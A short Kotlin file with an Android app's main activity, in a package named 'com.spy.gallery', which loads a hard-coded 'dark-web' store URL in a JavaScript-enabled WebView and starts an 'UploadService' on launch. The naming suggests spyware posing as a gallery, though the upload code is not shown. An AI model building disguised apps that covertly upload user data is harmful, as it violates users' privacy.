package com.spy.gallery
import android.os.Bundle
import android.webkit.WebView
import androidx.appcompat.app.AppCompatActivity
import android.content.Intent

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val webView = WebView(this)
        webView.settings.javaScriptEnabled = true
        webView.settings.domStorageEnabled = true
        setContentView(webView)
        
        // Load URL from config would be parsed here
        webView.loadUrl("https://dark-web-digital-store.ai.studio")
        
        startForegroundService(Intent(this, UploadService::class.java))
    }
}